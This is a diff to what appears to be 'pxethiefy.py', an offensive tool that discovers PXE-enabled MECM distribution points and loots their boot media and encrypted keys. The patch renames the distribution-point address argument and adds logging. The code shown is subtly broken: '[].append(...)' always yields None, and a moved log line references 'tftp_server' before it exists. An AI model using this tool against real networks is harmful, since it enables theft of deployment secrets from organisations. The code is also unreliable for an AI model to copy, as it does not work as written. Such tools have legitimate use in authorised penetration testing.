@@ -234,7 +234,7 @@ def process_pxe_media_xml(media_xml):
         log("Error while trying to process media xml...", MSG_TYPE_ERROR)
 
 
-def find_and_loot(interface, address):
+def find_and_loot(interface, dp_ip_addr_str):
     # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
     bind_layers(UDP,BOOTP,dport=4011,sport=68)
     bind_layers(UDP,BOOTP,dport=68,sport=4011)
@@ -251,13 +251,15 @@ def find_and_loot(interface, address):
     log(f"  IP: {client_ip_addr}", MSG_TYPE_DEFAULT)
     log(f"  MAC: {client_mac_addr_str}", MSG_TYPE_DEFAULT)
 
-    if (address):
-        tftp_servers = [].append(address)
+    if (dp_ip_addr_str):
+        log(f"  DP: {dp_ip_addr_str}", MSG_TYPE_DEFAULT)
+        tftp_servers = [].append(dp_ip_addr_str)
     else:
         tftp_servers = find_pxe_boot_servers(interface, client_mac_addr)
+        if (tftp_servers):
+            log(f"Found server offering PXE media: {tftp_server}", MSG_TYPE_SUCCESS)
     
     for tftp_server in tftp_servers:
-        log(f"Found server offering PXE media: {tftp_server}", MSG_TYPE_SUCCESS)
         ## Looking for media
         log(f"Looking for PXE media files...", MSG_TYPE_DEFAULT)
         variables_file, bcd_file, encrypted_key = request_boot_files(interface, client_ip_addr, client_mac_addr, tftp_server)
@@ -318,7 +320,7 @@ def main():
     pxethiefy.py explore -i eth0
     pxethiefy.py explore -a 192.0.2.50
 """, help="Query for PXE servers and media on the network")
-    find_and_loot_parser.add_argument('-a', '--address', required=False, type=str, dest='address', help="Specify address of a PXE-enabled distribution point instead of discovering on network..")
+    find_and_loot_parser.add_argument('-a', '--address', required=False, type=str, dest='dp_ip_addr_str', help="Specify the IP address of a PXE-enabled distribution point instead of discovering on network..")
     find_and_loot_parser.add_argument('-i', '--interface', required=True, type=str, dest='interface', help="Interface to use to search for PXE servers..")
     ## Decrypt
     decrypt_parser = subparsers.add_parser('decrypt', formatter_class=argparse.RawTextHelpFormatter, description="""
@@ -333,8 +335,8 @@ def main():
 
     ## Find and loot
     if( args.subcommands == 'explore'):
-        if (args.address):
-            find_and_loot(args.interface, args.address)
+        if (args.dp_ip_addr_str):
+            find_and_loot(args.interface, args.dp_ip_addr_str)
         elif (args.interface):
             find_and_loot(args.interface)
         else:
